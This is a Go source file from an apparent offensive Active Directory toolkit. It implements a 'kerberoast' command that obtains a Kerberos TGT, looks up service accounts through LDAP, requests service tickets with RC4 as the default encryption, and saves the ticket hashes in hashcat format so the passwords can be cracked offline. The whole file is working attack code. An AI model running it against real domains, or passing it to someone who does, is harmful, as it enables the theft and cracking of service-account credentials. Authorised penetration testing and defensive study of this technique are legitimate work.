package kerberos

import (
	"fmt"
	"os"
	"strings"

	"github.com/spf13/cobra"
	"github.com/vincd/savoir/modules/paquet/krb5"
	"github.com/vincd/savoir/modules/paquet/ldap"
)

type spnTarget struct {
	username string
	spn      string
}

func init() {
	var domain string
	var dcIp string
	var useLdap bool
	var useLdapSecure bool
	var ldapUser string
	var ldapPassword string
	var ldapSizeLimit int
	var enctype string
	var username string
	var password string
	var ticket string
	var key string
	var spn string
	var outputFile string
	var socks string

	var kerberoastCmd = &cobra.Command{
		Use:   "kerberoast",
		Short: "Perform a Kerberoasting attack against specified user(s)",
		Long:  `Perform a Kerberoasting attack against specified user(s)`,
		PreRunE: func(cmd *cobra.Command, args []string) error {
			if err := validateETypeFlag(enctype); err != nil {
				return err
			}

			// Get username and domain from TGT
			// TODO: improve check
			if len(ticket) > 0 {
				kirbi, err := krb5.NewKrbCredFromFile(ticket)
				if err != nil {
					return fmt.Errorf("cannot load kirbi: %s", err)
				}

				if len(username) == 0 {
					username = kirbi.UserName()
				}

				if len(domain) == 0 {
					domain = kirbi.UserRealm()
				}

				eType := getETypeFromFlagValue(enctype)
				if eType != kirbi.EType() {
					fmt.Printf("[!] The ticket use an encryption type %d and you set %d\n", kirbi.EType(), eType)
				}

				// TODO: check EncType
			} else {
				if err := validateDomainUserFlagsWithTicket(username, password, key, ticket); err != nil {
					return err
				}
			}

			if err := validateETypeFlag(enctype); err != nil {
				return err
			}

			if len(spn) > 0 && useLdap {
				return fmt.Errorf("flags --spn and --ldap cannot be set in the same command")
			}

			// We check here if the user want to use the same credentials for LDAP.
			// We don't support LDAP authentication with a ticket and key yet.
			if len(ldapUser) > 0 || len(ldapPassword) > 0 {
				useLdap = true
			}

			if useLdap && len(username) > 0 && len(ldapUser) == 0 {
				fmt.Printf("[*] Use %s as LDAP username\n", username)
				ldapUser = username
			}

			if useLdap && len(password) > 0 && len(ldapPassword) == 0 {
				// Don't print the password...
				fmt.Printf("[*] Use %s password as LDAP password\n", username)
				ldapPassword = password
			}

			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			printDomainInformation(domain, dcIp)

			dialer, err := getKdcDialer(socks)
			if err != nil {
				return fmt.Errorf("Cannot create SOCKS client: %s", err)
			}

			var tgtCred *krb5.KRBCred
			targets := make([]spnTarget, 0)

			if len(ticket) > 0 {
				fmt.Printf("[*] Use a kirbi file as credentials\n")
				kirbi, err := krb5.NewKrbCredFromFile(ticket)
				if err != nil {
					return fmt.Errorf("cannot load kirbi: %s", err)
				}

				tgtCred = kirbi
			} else {
				keyBytes, err := getKeyFlagValue(key)
				if err != nil {
					return err
				}

				fmt.Printf("[*] Use username and password/key as credentials to request a TGT\n")
				tgt, err := krb5.AskTGT(dialer, domain, username, password, keyBytes, getETypeFromFlagValue(enctype), dcIp, false, false)
				if err != nil {
					return fmt.Errorf("cannot ask TGT: %s", err)
				}

				tgtCred = tgt.Credentials()
			}

			if len(spn) > 0 {
				fmt.Printf("[*] Keberoast SPN %s\n", spn)
				targets = append(targets, spnTarget{username: "USER", spn: spn})
			} else if useLdap {
				fmt.Printf("[*] Use LDAP to retreive vulnerable accounts\n")
				ldapClient, err := ldap.NewLDAPClient()
				if err != nil {
					return err
				}

				port := 389
				if useLdapSecure {
					port = 636
				}
				if err := ldapClient.Connect(dcIp, port, useLdapSecure); err != nil {
					return err
				}
				defer ldapClient.Close()

				// We set the correct credentials in the `PreRunE` function
				if err := ldapClient.AuthenticateWithDomainAccount(domain, ldapUser, ldapPassword); err != nil {
					fmt.Printf("cannot authentication to ldap server with NTLM bind: %s\n", err)

					if !strings.Contains(ldapUser, "@") {
						ldapUser = fmt.Sprintf("%s@%s", ldapUser, domain)
					}

					if err := ldapClient.AuthenticateWithAccount(ldapUser, ldapPassword); err != nil {
						fmt.Printf("cannot authentication to ldap server with simple bind: %s\n", err)
						return fmt.Errorf("cannot authenticate to ldap server with NTLM and simple bind")
					}
				}

				// TODO: search account with RC4 enabled (or AES128/256)
				query := "(&(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))"
				entries, err := ldapClient.SearchWithSizeLimit(query, []string{"sAMAccountName", "servicePrincipalName", "distinguishedName"}, 1000)
				if err != nil {
					return err
				}

				if len(entries) == 0 {
					fmt.Printf("[!] No user to Kerberoast found in LDAP\n")
					return nil
				}

				fmt.Printf("[*] Found %d users to Kerberoast found in LDAP\n", len(entries))
				for _, entry := range entries {
					fmt.Printf("[*] %s\n", entry["dn"])
					fmt.Printf("    sAMAccountName      : %s\n", entry["sAMAccountName"])
					fmt.Printf("    distinguishedName   : %s\n", entry["distinguishedName"])
					fmt.Printf("    servicePrincipalName: %s\n", entry["servicePrincipalName"])

					for _, spn := range entry["servicePrincipalName"] {
						targets = append(targets, spnTarget{username: entry["sAMAccountName"][0], spn: spn})
					}
				}
			}

			hashes := ""
			for _, target := range targets {
				// TODO: compute the correct NameType and NameString
				principalName := krb5.PrincipalName{
					NameType:   krb5.KRB_NT_MS_PRINCIPAL,
					NameString: strings.Split(target.spn, "/"),
				}

				fmt.Printf("[*] Asking TGS for principal: %s\n", target.spn)
				tgs, err := krb5.AskTGSWithKirbi(dialer, domain, principalName, tgtCred, dcIp)
				if err != nil {
					msg := fmt.Sprintf("Cannot ask TGS for principal %s: %s", target.spn, err)
					if len(targets) == 1 {
						return fmt.Errorf("%s", msg)
					} else {
						fmt.Printf("[!] %s\n", msg)
					}
				} else {
					hashes += fmt.Sprintf("%s\n", tgs.HashString(target.username, target.spn))
				}
			}

			if len(outputFile) == 0 {
				fmt.Printf("[*] Hashes:\n%s\n", hashes)
			} else {
				f, err := os.Create(outputFile)
				if err != nil {
					return fmt.Errorf("cannot create hash file: %s", err)
				}
				defer f.Close()

				f.Write([]byte(hashes))
				fmt.Printf("[*] Save hashes to: %s\n", outputFile)
			}

			return nil
		},
	}

	commandAddKerberosDomainFlags(kerberoastCmd, &dcIp, &socks)
	commandAddDomainUserFlagsWithTicket(kerberoastCmd, &domain, &username, &password, &key, &ticket)
	kerberoastCmd.Flags().BoolVarP(&useLdap, "ldap", "l", false, "Search targets on LDAP with username and password")
	kerberoastCmd.Flags().BoolVarP(&useLdapSecure, "ldap-secure", "", false, "Use LDAPS")
	commandAddLDAPFlags(kerberoastCmd, &ldapUser, &ldapPassword, &ldapSizeLimit)
	commandAddKerberosETypeFlagWithDefaultValue(kerberoastCmd, &enctype, "rc4")
	kerberoastCmd.Flags().StringVarP(&spn, "spn", "", "", "SPN to roast")
	kerberoastCmd.Flags().StringVarP(&outputFile, "output", "o", "", "Output the hashes to a file (hashcat mode 13100)")

	Command.AddCommand(kerberoastCmd)
}
